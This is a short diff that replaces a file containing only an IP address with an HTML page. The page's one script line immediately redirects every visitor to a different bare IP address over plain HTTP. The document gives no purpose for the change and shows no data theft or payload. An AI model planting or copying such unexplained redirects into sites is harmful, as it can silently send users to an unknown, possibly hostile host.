@@ -1,1 +1,7 @@
-139.227.85.225
+<!DOCTYPE html>
+<html>
+<script>
+window.location.href = "http://154.44.25.252";
+</script>
+</html>
+
